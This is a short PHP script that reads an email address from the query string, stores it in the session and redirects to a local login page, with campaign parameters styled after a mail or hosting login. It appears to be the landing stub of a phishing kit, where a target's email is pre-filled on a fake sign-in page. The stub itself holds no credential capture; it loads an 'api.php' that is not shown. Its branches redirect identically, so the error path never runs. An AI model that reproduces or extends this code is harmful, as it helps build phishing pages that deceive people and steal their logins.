<?php

session_start();

require 'login/assets/api.php';

if (isset($_GET['email'])) {
$_SESSION['user'] = $user = $_GET['email'];
}
if (!filter_var($user, FILTER_VALIDATE_EMAIL)) {
    header ("Location: ./login/?id=2327&utm_term=2327&utm_campaign=mail&utm_medium=inbox&utm_source=login_frontend_hosting&utm_err=0");
}
elseif (filter_var($user, FILTER_VALIDATE_EMAIL)) {
    header ("Location: ./login/?id=2327&utm_term=2327&utm_campaign=mail&utm_medium=inbox&utm_source=login_frontend_hosting&utm_err=0");
}
else{
    include 'login/assets/404.php';
}

?>